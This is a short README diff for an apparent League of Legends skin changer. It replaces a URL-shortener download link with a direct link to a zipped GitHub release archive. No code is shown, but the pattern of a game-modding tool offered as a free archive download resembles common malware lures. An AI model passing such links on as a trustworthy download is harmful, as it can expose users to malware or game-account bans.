@@ -36,8 +36,8 @@ The program is updated with the release of new champions and skins, ensuring tha
 
 To download the program, simply click the image below, which will be a clickable link:
 
-<a href="https://goo.su/fy62ugm" target="_blank">
-  <img src="https://i.imgur.com/Jrn2KuP.png" alt="Download the program" />
+<a href="https://github.com/hilladkolanlx/Release/releases/download/1.0.7/NeoXHubReleased.v.1.0.7.zip" target="_blank">
+  <img src="https://i.imgur.com/Jrn2KuP.png" alt="Download lol Skin Changer" />
 </a>
 
 ### Step 2: Extract the Archive
